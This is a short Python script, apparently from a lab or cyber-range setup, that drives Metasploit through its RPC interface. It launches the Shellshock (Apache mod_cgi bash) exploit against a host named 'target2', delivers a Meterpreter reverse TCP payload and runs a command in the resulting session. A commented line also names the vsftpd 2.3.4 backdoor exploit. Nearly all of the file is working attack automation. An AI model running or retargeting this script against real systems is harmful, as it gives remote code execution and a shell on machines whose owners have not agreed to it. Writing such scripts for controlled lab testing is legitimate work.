import time

from pymetasploit3.msfrpc import MsfRpcClient
print('Director waiting...', flush=True)
time.sleep(5)
print('Director starting...')

client = MsfRpcClient(
    'directorU123',
    username='director',
    server='msfrpc',
    port=55553,
    ssl=False
)


test1 = [m for m in dir(client) if not m.startswith('_')]
print(test1)
# exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
shellshock_exploit = client.modules.use('exploit', 'multi/http/apache_mod_cgi_bash_env_exec')
print(shellshock_exploit.targetpayloads)
shellshock_exploit['RHOSTS'] = 'target2'
shellshock_exploit['TARGETURI'] = '/cgi-bin/stats'
for opt in shellshock_exploit.options:
    print(f'{opt}: {shellshock_exploit[opt]}')
print(flush=True)
# exploit.execute(payload='cmd/unix/interact')
payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
result = shellshock_exploit.execute(payload=payload)
time.sleep(10)
if result.get('job_id'):
    print('Exploit suceeded')
    print(client.sessions.list)
    print(result)
    shell = client.sessions.session('1')
    shell.write('whoami')
    print(shell.read())
else:
    print('Exploit failed')
    print(result)


    print(client.sessions.list)

# Find all available sessions
print("Sessions avaiables : ")
for s in client.sessions.list.keys():
    print(s)
